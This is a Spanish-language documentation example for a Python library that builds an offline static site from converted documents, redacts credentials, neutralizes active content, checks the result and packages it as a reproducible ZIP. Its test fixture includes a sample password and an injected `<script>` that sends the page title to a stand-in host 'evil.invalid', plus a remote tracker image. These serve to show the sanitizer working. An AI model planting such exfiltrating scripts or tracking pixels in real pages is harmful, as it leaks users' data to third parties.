# Ejemplo: Sitio sin Conexión

**Objetivo**: Demostrar cómo construir el sitio de un contexto para verse sin conexión con `work_dir` (sin tocar el
proyecto), comprobarlo con `check_site_offline` antes de entregarlo y empaquetarlo con `write_site_zip`.

## 1. Contexto del Ejemplo

Para entregar el sitio del contexto a quien no tiene cuenta en la web (un auditor, un cliente),
`SiteGenerator.generate(offline=True)` construye un sitio que se abre desde el disco, sin pedir nada a terceros, y
neutraliza el contenido activo que traigan los documentos. Antes de entregarlo, `check_site_offline` lo revisa
(`OfflineSiteReport`, con un `OfflineIssue` por problema) y `write_site_zip` lo empaqueta en un ZIP reproducible.

El contexto se construye como en [Construir el contexto](context-build.md), con dos documentos de terceros que traen algo
que no debe llegar activo al sitio: una contraseña y un `<script>` en uno, una imagen remota en el otro. `Reorganizer`
deja la carpeta reorganizada de la que sale el sitio. El ejemplo ejecuta `zensical build` de verdad.

### Requisitos

- Python 3.12+
- `doc_organize[context,site]` instalado (PyYAML para el manifiesto; Zensical para construir el sitio)

Los ficheros se crean en un directorio temporal; no se llama a ningún servicio externo (las URLs `*.invalid` de los
documentos nunca se cargan).

## 2. Implementación de Referencia

```python
import asyncio
import json
import tempfile
import zipfile
from pathlib import Path

from doc_organize import (
    ContextBuilder,
    ConversionResult,
    OfflineSiteError,
    Project,
    Reorganizer,
    SiteGenerator,
    check_site_offline,
    parse_taxonomy_template,
    write_site_zip,
)

MANIFEST = """\
---
schema: 2
axes:
- key: domains
  name: Dominios
  organizes: folder
  entries:
  - slug: gestion-proveedores
    name: Gestión de Proveedores
    keywords: [proveedor, homologacion]
  - slug: mejora-continua
    name: Mejora Continua
    keywords: [no conformidad, accion correctiva]
- key: material_types
  name: Tipos de material
  organizes: subfolder
  entries:
  - slug: procedimiento
    name: Procedimiento
  - slug: registro
    name: Registro
---
"""


def converted(root: Path, relative: str, title: str, text: str) -> ConversionResult:
    """Original en `origen/` y su `.md` + `.json` en `Conversión/`, como en el ejemplo de construir el contexto."""
    source = root / "origen" / relative
    source.parent.mkdir(parents=True, exist_ok=True)
    source.write_text(text, encoding="utf-8")
    markdown = root / "Conversión" / f"{Path(relative).stem}.md"
    markdown.parent.mkdir(parents=True, exist_ok=True)
    markdown.write_text(f"# {title}\n\n{text}\n", encoding="utf-8")
    json_path = markdown.with_suffix(".json")
    json_path.write_text(json.dumps({"title": title, "chunks": [{"text": text}]}, ensure_ascii=False), encoding="utf-8")
    return ConversionResult(source_path=str(source), markdown_path=str(markdown), json_path=str(json_path), success=True)


async def main() -> None:
    with tempfile.TemporaryDirectory() as tmp:
        base = Path(tmp).resolve()
        root = base / "proyecto"
        project = Project(name="Demo", root_path=str(root), created_at="2026-01-01T00:00:00+00:00")
        documents = [
            converted(root, "compras/alta.txt", "Procedimiento de homologación de proveedores",
                      "Alta de un proveedor y revisión anual de su homologacion.\n\n"
                      "Acceso al portal de compras: password=Sup3rS3creta!\n\n"
                      '<script>fetch("https://evil.invalid/?q=" + document.title)</script>'),  # HTML de terceros
            converted(root, "calidad/nc-2026-04.txt", "Registro de no conformidad 04",
                      "Registro de la no conformidad y de la accion correctiva acordada.\n\n"
                      "![Foto de la incidencia](https://fotos.invalid/nc-04.jpg)"),  # Imagen remota
        ]
        context = await ContextBuilder().build(
            project, documents, taxonomy_manifest=parse_taxonomy_template(MANIFEST), decisions=False, persist=False
        )
        await Reorganizer().reorganize(project, context)  # La carpeta reorganizada, de donde sale el sitio

        # 1) Construir aparte: el proyecto no cambia
        work_dir = base / "entrega"
        result = await SiteGenerator().generate(project, context, offline=True, llms_txt=True, work_dir=work_dir)
        print(f"Construido: {result.site_built}, sin conexión: {result.offline}, "
              f"sitio en work_dir: {result.site_dir == work_dir / 'site'}")
        print(f"Neutralizado: {result.neutralized_counts}")
        print(f"Páginas neutralizadas: {sorted(Path(p).name for p in result.neutralized)}")
        print(f"Páginas con credenciales redactadas: {sorted(Path(p).name for p in result.credentials_redacted)}")
        print(f"¿Tocó el proyecto? {(root / 'zensical.toml').exists() or (root / 'site').exists()}")
        for name in ("alta.md", "nc-2026-04.md"):  # Las copias en work_dir, ya redactadas y neutralizadas
            print(f"--- {name} en work_dir")
            print(next(work_dir.rglob(name)).read_text(encoding="utf-8").strip())
        site = result.site_dir
        relevant = sorted(
            p.relative_to(site).as_posix() for p in site.rglob("*")
            if p.is_file() and (p.suffix in (".html", ".txt", ".json", ".md") or p.name == "search.js")
            and not p.relative_to(site).as_posix().startswith(("assets/", "stylesheets/", "javascripts/"))
        )
        print("--- Ficheros del sitio (sin los recursos del tema)")
        print("\n".join(f"  {name}" for name in relevant))

        # 2) Comprobar antes de entregar
        report = check_site_offline(site)
        print(f"--- check_site_offline: ok={report.ok} páginas={report.pages} search.js={report.search_index_js} "
              f"problemas={report.problems()}")
        hosts = sorted({issue.detail.split("/")[2] for issue in report.script_references})
        print(f"URLs de terceros en el JavaScript del tema (informativas): {hosts}")

        # 3) Empaquetar: reproducible
        first = await asyncio.to_thread(write_site_zip, base / "sitio.zip", site, project_name=project.name)
        second = await asyncio.to_thread(write_site_zip, base / "otra-vez.zip", site, project_name=project.name)
        with zipfile.ZipFile(base / "sitio.zip") as archive:
            names = archive.namelist()
        print(f"--- ZIP: mismo SHA-256 dos veces: {first.sha256 == second.sha256}, "
              f"ficheros: {first.file_count == len(names)}")
        print(f"Fuera de sitio/: {[n for n in names if not n.startswith('sitio/')]}, "
              f"con sitio/index.html: {'sitio/index.html' in names}")

        # 4) Un sitio que no se puede entregar: alguien añade a mano una imagen remota y un enlace a una carpeta
        index = site / "index.html"
        index.write_text(index.read_text(encoding="utf-8").replace(
            "</body>", '<img src="https://tracker.invalid/p.gif"><a href="gestion-proveedores/">Proveedores</a></body>'
        ), encoding="utf-8")
        report = check_site_offline(site)
        print(f"--- Tras tocar index.html: ok={report.ok}")
        for problem in report.problems():
            print(f"  {problem}")
        try:
            write_site_zip(base / "roto.zip", site)
        except OfflineSiteError as exc:
            print(f"OfflineSiteError: {len(exc.problems)} problemas; ZIP escrito: {(base / 'roto.zip').exists()}")


if __name__ == "__main__":
    asyncio.run(main())
```

## 3. Explicación del Código

1. **Carpeta reorganizada**: el sitio sale de `<proyecto>/<output_folder_name>/`, que escribe `Reorganizer.reorganize`
   (original, `.md` y `.json` de cada documento en `<dominio>/<tipo>/<doc>/`)
2. **`work_dir`**: tiene que no existir o estar vacía y quedar fuera de la raíz del proyecto. Se copia ahí la carpeta
   reorganizada y en esa copia se redacta, se neutraliza y se escriben `zensical.toml` y el sitio
   (`<work_dir>/site`); el proyecto queda igual (ni `zensical.toml` ni `site/`). No se admite junto con `site_dir`, y
   borrar `work_dir` después es cosa de quien llama
3. **Redacción y neutralización**: la contraseña sale como `«REDACTADO»` (`credentials_redacted`) y, con `offline=True`,
   siempre se neutraliza el contenido activo: el `<script>` queda escapado (se ve como texto; `html` cuenta cada
   etiqueta, la de apertura y la de cierre) y la imagen remota pasa a un enlace «Imagen externa», así que abrir la
   página no avisa a nadie. `neutralized` y `neutralized_counts` dicen dónde y cuánto
4. **Qué se publica**: las páginas, `llms.txt` (por `llms_txt=True`) y el índice de búsqueda en JavaScript
   (`search.js`), que es el que funciona desde `file://`. Los originales (`alta.txt`) y los `.json` de la conversión no
   se publican con `offline=True` (`include_originals=True` los incluiría). La lista omite los recursos del tema, que
   dependen de la versión de Zensical
5. **`check_site_offline`**: `ok` es `True` si hay páginas, está `search.js` y no hay recursos de terceros, enlaces a
   carpetas, enlaces rotos ni contenido activo. `script_references` es informativa: el JavaScript del tema lleva URLs
   de unpkg y jsDelivr que solo usaría bajo demanda para funciones que este sitio no activa
6. **ZIP reproducible**: `write_site_zip` es síncrona (desde async, `asyncio.to_thread`). Mismo `site/`, mismo SHA-256
   (orden alfabético, fecha y permisos fijos). Lleva el sitio en `sitio/`, `start_server.py` y `VER_SITIO.md`
7. **Sitio que no pasa**: si alguien toca el sitio después de construirlo (aquí, una imagen remota y un enlace a una
   carpeta, que desde `file://` no abre su `index.html`), `check_site_offline` lo detecta y `write_site_zip` lanza
   `OfflineSiteError` con los problemas (`exc.problems`) sin escribir nada

## 4. Ejecución y Pruebas

```bash
$ python offline_site_example.py
Construido: True, sin conexión: True, sitio en work_dir: True
Neutralizado: {'html': 2, 'remote_images': 1}
Páginas neutralizadas: ['alta.md', 'nc-2026-04.md']
Páginas con credenciales redactadas: ['alta.md']
¿Tocó el proyecto? False
--- alta.md en work_dir
# Procedimiento de homologación de proveedores

Alta de un proveedor y revisión anual de su homologacion.

Acceso al portal de compras: password=«REDACTADO»

&lt;script>fetch("https://evil.invalid/?q=" + document.title)&lt;/script>
--- nc-2026-04.md en work_dir
# Registro de no conformidad 04

Registro de la no conformidad y de la accion correctiva acordada.

[Imagen externa: Foto de la incidencia](https://fotos.invalid/nc-04.jpg)
--- Ficheros del sitio (sin los recursos del tema)
  404.html
  gestion-proveedores/procedimiento/alta/alta.html
  index.html
  llms.txt
  mejora-continua/registro/nc-2026-04/nc-2026-04.html
  search.js
  search.json
--- check_site_offline: ok=True páginas=4 search.js=True problemas=[]
URLs de terceros en el JavaScript del tema (informativas): ['cdn.jsdelivr.net', 'unpkg.com']
--- ZIP: mismo SHA-256 dos veces: True, ficheros: True
Fuera de sitio/: ['VER_SITIO.md', 'start_server.py'], con sitio/index.html: True
--- Tras tocar index.html: ok=False
  Recurso de terceros en index.html: https://tracker.invalid/p.gif
  Enlace a una carpeta en index.html: gestion-proveedores/
OfflineSiteError: 2 problemas; ZIP escrito: False
```

La salida no muestra tamaños, tiempos ni el SHA-256 (cambia con la versión de Zensical), solo si dos ZIP del mismo
sitio coinciden. Validación sintáctica: `python -m py_compile offline_site_example.py`.

## 5. Referencias Relacionadas

- [Referencia técnica: Sitio sin conexión](../api/offline_site.md)
- [Documentación funcional: Seguridad del sitio](../functional/context.md#seguridad-del-sitio)
- [Ejemplo: Construir el contexto](context-build.md)
- [Ejemplo: Paquete para IA](ai-bundle.md) (el mismo `llms.txt`, en un ZIP para un chat de IA)
- [Ejemplo: Exportar un proyecto](export-project.md)
